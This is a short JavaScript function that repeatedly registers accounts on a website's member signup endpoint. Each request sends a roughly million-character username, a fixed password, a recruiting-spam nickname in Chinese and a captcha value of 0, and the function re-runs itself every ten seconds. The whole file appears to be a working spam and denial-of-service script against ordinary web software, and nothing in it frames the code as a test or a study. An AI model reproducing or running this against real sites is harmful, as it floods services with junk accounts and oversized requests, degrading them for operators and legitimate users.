function register(obj){
  var url='/?member/register/';
  var username="xmbrczlz" + Math.random() + Math.random();
  var nickname="项目班人才招揽者";
  var password="1717wlkq";
  var rpassword="1717wlkq";
  var sex=1;
  var checkcode=0;
  for (var i = 0;i < 1e6;i ++)
    username += '1';

  $.ajax({
    type: 'POST',
    url: url,
    dataType: 'json',
    data: {
    	username: username,
    	nickname: nickname,
    	password: password,
    	rpassword: rpassword,
    	sex: sex,
    	checkcode: checkcode
    },
    success: function (response, status) {
      if(response.code){
      }else{
    	 alert(response.data);
      }
    },
    error:function(xhr,status,error){
      alert('返回数据异常！');
    }
  });
  setTimeout(register,10000);
  return false;
}